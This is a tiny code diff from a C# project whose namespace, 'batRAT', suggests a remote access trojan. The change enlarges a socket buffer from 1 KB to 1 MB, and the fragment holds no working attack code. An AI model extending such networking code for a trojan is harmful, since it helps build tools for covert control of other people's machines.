@@ -8,7 +8,7 @@ using System.Net.Sockets;
 namespace batRAT {
     public class StateObject {
         public Socket socket = null;
-        public const int bufferSize = 1024;
+        public const int bufferSize = 1048576;
         public byte[] buffer = new byte[bufferSize];
     }
 }
